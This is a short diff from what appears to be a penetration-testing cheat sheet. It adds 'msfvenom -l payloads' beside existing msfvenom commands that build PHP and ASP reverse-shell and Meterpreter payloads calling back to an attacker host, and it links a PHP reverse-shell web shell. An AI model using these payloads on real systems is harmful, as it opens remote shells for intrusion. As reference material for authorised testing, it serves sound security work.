@@ -1321,6 +1321,7 @@ XAMPP: C:\xampp\htdocs\
 http://pentestmonkey.net/tools/web-shells/php-reverse-shell
 Edit IP address and port
 
+$ msfvenom -l payloads
 $ msfvenom -p php/reverse_php LHOST=<IP address> LPORT=<Port> -f raw > shell.php
 $ msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP address> LPORT=<Port> -f raw > shell.php
 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> -f asp > shell.asp
